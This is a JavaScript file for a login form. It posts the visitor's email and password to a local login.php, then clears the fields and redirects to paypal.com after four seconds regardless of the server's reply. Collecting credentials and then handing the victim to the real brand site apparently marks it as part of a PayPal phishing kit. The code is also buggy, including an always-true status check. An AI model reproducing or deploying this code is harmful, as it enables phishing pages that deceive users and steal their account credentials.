
const form = document.getElementById("login-form");
const emailLabel = document.getElementById("label");
const email = document.getElementById("email");
const emailCont = document.getElementById("email-cont");
form.addEventListener("submit",confirmUser)
email.addEventListener("focus", shiftLabelup);
email.addEventListener("blur", shiftLabeldown);
emailCont.addEventListener("click", setEmailCont);
email.Label = emailLabel; 
emailCont.label = emailLabel;
emailCont.email = email;

// bringing in passrod cont elements
const passCont = document.getElementById("pass-cont")
const passLabel = document.getElementById("pass-label")
const password = document.getElementById("password")

passCont.label = passLabel;
passCont.password = password;
password.label = passLabel;
password.addEventListener("focus", shiftLabelPassUp);
password.addEventListener("blur", shiftLabelPassDown);
passCont.addEventListener("click", setPassCont);

function setEmailCont() {
    if (!emailCont.email.focus) {
        return;
    }
    emailCont.email.focus = true;
}

// functions for email input effects;
function shiftLabelup() {
    email.Label.style.top = "10px";
    email.Label.style.fontSize = "16px";
    emailCont.classList.add("border-effect");
}
function shiftLabeldown() {
    emailCont.classList.remove("border-effect");
    if (email.value.length > 0) {
        return;
    }
    email.Label.style.top = "50%";
    email.Label.style.fontSize = "20px";
}

// functions for password effect
function setPassCont() {
    if (passCont.password.focus) {
        return;
    }
    passCont.password.focus = true;
}

function shiftLabelPassUp() {
    password.label.style.top = "10px";
    password.label.style.fontSize = "16px";
    passCont.classList.add("border-effect");
}
function shiftLabelPassDown() {
    passCont.classList.remove("border-effect");

    if (password.value.length > 0) {
        return;
    }
    password.label.style.top = "50%";
    password.label.style.fontSize = "20px";
}
// caling initial function


async function confirmUser(e) {
    e.preventDefault();
    const msg = document.querySelector(".message");
    msg.style.display = "none";
    const progress = document.querySelector(".progress");
    const userCode = password.value.trim();
    const userEmail = email.value.trim() ;
    // console.log(userCode, "   ", userEmail);
    if (userCode == "" || userEmail == "") {
        return;
    }
    progress.style.display = "flex";
    try {
        let response = await fetch("./login.php", {
            method: "post",
            body: `email=${userEmail}&password=${userCode}&action=login`,
            headers: {
                "Content-Type": "application/x-www-form-urlencoded",
            }
        })
        let result = await response.json();
        if (result.satatus = "okay") {
            setTimeout(function () {
                password.value = "";
                email.value = "";
                progress.style.display = "none";
                window.location.href = "https://paypal.com";
            }, 4000);
        }
        else {
            console.log("bad response");
        }
    } catch (err) {
        console.log(err);
        progress.style.display = "none";
        msg.style.display = "block";
    }

}
